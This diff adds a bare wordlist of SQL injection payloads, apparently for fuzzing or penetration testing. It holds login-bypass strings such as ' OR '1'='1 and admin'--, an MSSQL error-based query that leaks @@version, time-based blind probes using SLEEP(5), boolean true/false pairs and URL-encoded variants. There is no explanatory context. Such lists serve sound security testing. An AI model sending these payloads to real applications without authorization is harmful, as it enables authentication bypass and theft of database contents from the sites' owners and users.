@@ -1,0 +1,39 @@
+' OR '1'='1
+" OR "1"="1
+' OR 1=1--
+" OR 1=1--
+1 OR 1=1
+' OR 'a'='a
+" OR "a"="a
+') OR ('1'='1
+')-- -
+admin'--
+' OR 1=1#
+'
+"
+'
+') 
+" OR "" = "
+' AND 1=CONVERT(int, (SELECT @@version))--  -- MSSQL
+' AND 1=(SELECT COUNT(*) FROM tabname); --
+' AND SLEEP(5)--
+" AND SLEEP(5)--
+1 AND SLEEP(5)
+1 OR SLEEP(5)=1
+1' AND IF(1=1, SLEEP(5), 0)--+
+' AND 1=1 --
+' AND 1=2 --
+" AND 1=1 --
+" AND 1=2 --
+1' AND '1'='1
+1' AND '1'='2
+%27%20OR%201=1--
+%22%20OR%201=1--
+%27%20AND%20SLEEP(5)--
+admin')-- 
+admin')# 
+admin")-- 
+admin")# 
+admin' or '1'='1' --
+admin" or "1"="1" --
+') or ('a'='a
